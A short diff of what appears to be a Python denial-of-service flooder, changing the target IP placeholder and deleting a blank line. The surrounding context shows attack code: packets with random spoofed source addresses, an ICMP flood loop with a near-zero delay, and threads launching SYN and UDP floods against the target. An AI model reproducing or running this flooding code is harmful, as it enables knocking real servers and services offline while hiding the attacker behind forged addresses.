@@ -3,7 +3,7 @@ import threading
 import random
 import time
 
-target_ip = "YOUR_SERVER_IP"
+target_ip = "ip"
 target_port = 80  
 
 def random_ip():
@@ -25,7 +25,6 @@ def icmp_flood():
         packet = IP(src=random_ip(), dst=target_ip) / ICMP() / Raw(load=payload)
         send(packet, verbose=False)
         time.sleep(0.0001)
-
 for _ in range(3):
     threading.Thread(target=syn_flood).start()
     threading.Thread(target=udp_flood).start()
